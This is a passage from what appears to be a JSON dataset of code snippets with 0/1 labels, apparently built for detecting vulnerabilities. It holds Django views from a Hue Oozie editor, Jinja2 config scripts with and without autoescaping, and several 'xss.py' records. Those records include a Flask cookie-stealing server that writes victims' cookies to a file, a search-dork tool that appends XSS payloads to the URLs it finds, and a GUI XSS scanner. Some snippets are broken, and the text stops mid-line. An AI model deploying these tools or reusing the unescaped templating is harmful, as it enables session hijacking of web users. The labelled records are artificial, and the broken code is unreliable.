deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json,\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflows_json': json.dumps(workflows),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json,\n      'coordinators_json': json.dumps(coordinators),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n/n/n/n", "label": 1}, {"id": "8c40c66ea7c483a0cbda4c21940180af909aab99", "code": "utils/make_eb_config.py/n/nimport os\nimport argparse\nfrom jinja2 import Environment, FileSystemLoader\n\n\ndef make_eb_config(application_name, default_region):\n    # Capture our current directory\n    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n    # Create the jinja2 environment.\n    # Notice the use of trim_blocks, which greatly helps control whitespace.\n    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)\n    return j2_env.get_template('templates/eb/config.yml').render(\n        APPLICATION_NAME=application_name,\n        DEFAULT_REGION=default_region\n    )\n\n\ndef write_eb_config(dest, application_name, default_region):\n    contents = make_eb_config(application_name, default_region)\n    fh = open(dest, 'w')\n    fh.write(contents)\n    fh.close()\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='EB Config Maker')\n    # Optional argument\n    parser.add_argument('--dest', type=str,\n                        help='The destination of the generated eb config',\n                        default='./.elasticbeanstalk/config.yml')\n\n    parser.add_argument('--name', type=str,\n                        required=True,\n                        help='The name of the application')\n\n    parser.add_argument('--region', type=str,\n                        required=True,\n                        help='The default application region')\n\n    args = parser.parse_args()\n\n    write_eb_config(args.dest, application_name=args.name, default_region=args.region)\n/n/n/n", "label": 0}, {"id": "8c40c66ea7c483a0cbda4c21940180af909aab99", "code": "/utils/make_eb_config.py/n/nimport os\nimport argparse\nfrom jinja2 import Environment, FileSystemLoader\n\n\ndef make_eb_config(application_name, default_region):\n    # Capture our current directory\n    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n    # Create the jinja2 environment.\n    # Notice the use of trim_blocks, which greatly helps control whitespace.\n    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n    return j2_env.get_template('templates/eb/config.yml').render(\n        APPLICATION_NAME=application_name,\n        DEFAULT_REGION=default_region\n    )\n\n\ndef write_eb_config(dest, application_name, default_region):\n    contents = make_eb_config(application_name, default_region)\n    fh = open(dest, 'w')\n    fh.write(contents)\n    fh.close()\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='EB Config Maker')\n    # Optional argument\n    parser.add_argument('--dest', type=str,\n                        help='The destination of the generated eb config',\n                        default='./.elasticbeanstalk/config.yml')\n\n    parser.add_argument('--name', type=str,\n                        required=True,\n                        help='The name of the application')\n\n    parser.add_argument('--region', type=str,\n                        required=True,\n                        help='The default application region')\n\n    args = parser.parse_args()\n\n    write_eb_config(args.dest, application_name=args.name, default_region=args.region)\n/n/n/n", "label": 1}, {"id": "6b303259f62432bcb323721f038b4396e356ff6f", "code": "content/xss.py/n/nimport urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n        parser = BeautifulSoup(send.data, features=\"lxml\")\n        for link in parser.find_all('cite'):\n            result = link.string\n            x = str(input(\"[Input Script] >_ \"))\n            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n/n/n/n", "label": 0}, {"id": "6b303259f62432bcb323721f038b4396e356ff6f", "code": "/content/xss.py/n/nimport urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        for page in range(4):\n            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n            parser = BeautifulSoup(send.data, features=\"lxml\")\n            for link in parser.find_all('cite'):\n                result = link.string\n                x = str(input(\"[Input Script] >_ \"))\n                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n/n/n/n", "label": 1}, {"id": "9bb7a1ac857c2dce57118beb79bb3a343f6b51ec", "code": "content/xss.py/n/nimport urllib3 as url\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)\n        parser = BeautifulSoup(send.data, features=\"html.parser\")\n        x = str(input(\"[Message] >_ \"))\n        print(\"[+] Here's the result ! \\n\")\n        print(\"-----------------------------------------\")\n        for link in parser.find_all('cite'):\n            result = link.string\n            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n\n        print(\"-----------------------------------------\")\n/n/n/n", "label": 0}, {"id": "9bb7a1ac857c2dce57118beb79bb3a343f6b51ec", "code": "/content/xss.py/n/nimport urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n        parser = BeautifulSoup(send.data, features=\"lxml\")\n        for link in parser.find_all('cite'):\n            result = link.string\n            x = str(input(\"[Input Script] >_ \"))\n            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n/n/n/n", "label": 1}, {"id": "f89875a106cac251e066535823c3fada522a7ae1", "code": "xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 0}, {"id": "f89875a106cac251e066535823c3fada522a7ae1", "code": "/xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'steal cookie :) '\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 1}, {"id": "33993d2dca4259e574211b8fa84032894b278bb0", "code": "xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 0}, {"id": "33993d2dca4259e574211b8fa84032894b278bb0", "code": "/xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\nprint(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 1}, {"id": "d20b8de6b838a490155218b2306c87f6060713a6", "code": "xss.py/n/ntry:\n\tfrom flask import Flask,request\n\tfrom termcolor import colored\n\tfrom time import sleep\nexcept:\n\tprint('[!] Install The Modules .. ')\n\timport os\n\tos.system('pip install flask')\n\tos.system('pip install termcolor')\n\tos.system('pip install time')\n\tsys.exit()\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 0}, {"id": "d20b8de6b838a490155218b2306c87f6060713a6", "code": "/xss.py/n/nfrom flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n/n/n/n", "label": 1}, {"id": "7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1", "code": "xss.py/n/nimport sys,threading,time\nfrom datetime import datetime\ntry:\n from tkinter import *\n from tkinter import ttk\nexcept:\n print(\"You need to install: tkinter\")\n sys.exit()\ntry:\n import bane\nexcept:\n print(\"You need to install: bane\")\n sys.exit()\n\nclass sc(threading.Thread):\n def run(self):\n  global stop\n  ti=time.time()\n  print(\"=\"*25)\n  print(\"\\n[*]Target: {}\\n[*]Date: {}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\")))\n  crl=[target.get()]\n  if crawl.get()=='On':\n   crl+=bane.crawl(target.get(),bypass=True)\n  pr=proxy.get()\n  if len(pr)==0:\n   pr=None\n  if method.get()==\"GET\":\n   get=True\n   post=False\n  elif method.get()==\"POST\":\n   get=False\n   post=True\n  else:\n   get=True\n   post=True\n  fresh=False\n  if refresh.get()==\"On\":\n   fresh=True\n  ck=None\n  c=cookie.get()\n  if len(c)>0:\n   ck=c\n  for x in crl:\n   if stop==True:\n    break\n   print(\"[*]URL: {}\".format(x))\n   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)\n  print(\"[*]Test was finished at: {}\\n[*]Duration: {} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti)))\n  print(\"=\"*25)\n\nstop=False\n\ndef scan():\n sc().start()\n\nclass ki(threading.Thread):\n def run(self):\n  global stop\n  stop=True\n\ndef kill():\n ki().start()\n\nmain = Tk()\nmain.title(\"XSS Sonar\")\nmain.configure(background='light sky blue')\nLabel(main, text = \"Target:\",background='light sky blue').grid(row=0)\nLabel(main, text = \"Cookie: (Optional)\",background='light sky blue').grid(row=1)\nLabel(main, text = \"Method:\",background='light sky blue').grid(row=2)\nLabel(main, text = \"Timeout:\",background='light sky blue').grid(row=3)\nLabel(main, text = \"User-Agent:\",background='light sky blue').grid(row=4)\nLabel(main, text = \"Payload:\",background='light sky blue').grid(row=5)\nLabel(main, text = \"HTTP Proxy:\",background='light sky blue').grid(row=6)\nLabel(main, text = \"Refresh:\",background='light sky blue').grid(row=7)\nLabel(main, text = \"Crawl\",background='light sky blue').grid(row=8)\nLabel(main, text = \"\",background='light sky blue').grid(row=9)\nLabel(main, text = \"\",background='light sky blue').grid(row=10)\n\nua=[\"\"]\nua+=bane.ua\nli=bane.read_file('xss.txt')\npl=['']\nfor x in li:\n pl.append(x.strip())\nprox=[\"\"]\nprox+=bane.http(200)\nglobal target\ntarget = Entry(main)\ntarget.insert(0,'http://')\nglobal cookie\ncookie=Entry(main)\nglobal method\nmethod= ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"])\nglobal timeout\ntimeout=ttk.Combobox(main, values=range(1,61))\ntimeout.current(14)\nglobal user_agent\nuser_agent=ttk.Combobox(main, values=ua)\nuser_agent.current(1)\nglobal payload\npayload = ttk.Combobox(main, values=pl)\npayload.current(0)\nglobal proxy\nproxy=ttk.Combobox(main, values=prox)\nglobal refresh\nrefresh=ttk.Combobox(main, values=[\"On\", \"Off\"])\nglobal crawl\ncrawl=ttk.Combobox(main, values=[\"On\", \"Off\"])\n\ntarget.grid(row=0, column=1)\ntarget.config(width=30)\ncookie.grid(row=1, column=1)\ncookie.config(width=30)\nmethod.grid(row=2, column=1)\nmethod.current(0)\nmethod.config(width=30)\ntimeout.grid(row=3, column=1)\ntimeout.config(width=30)\nuser_agent.grid(row=4, column=1)\nuser_agent.config(width=30)\npayload.grid(row=5, column=1)\npayload.config(width=30)\nproxy.grid(row=6, column=1)\nproxy.current(0)\nproxy.config(width=30)\nrefresh.grid(row=7, column=1)\nrefresh.current(1)\nrefresh.config(width=30)\ncrawl.grid(row=8, column=1)\ncrawl.current(0)\ncrawl.config(width=30)\n\nButton(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)\nButton(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)\nButton(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, 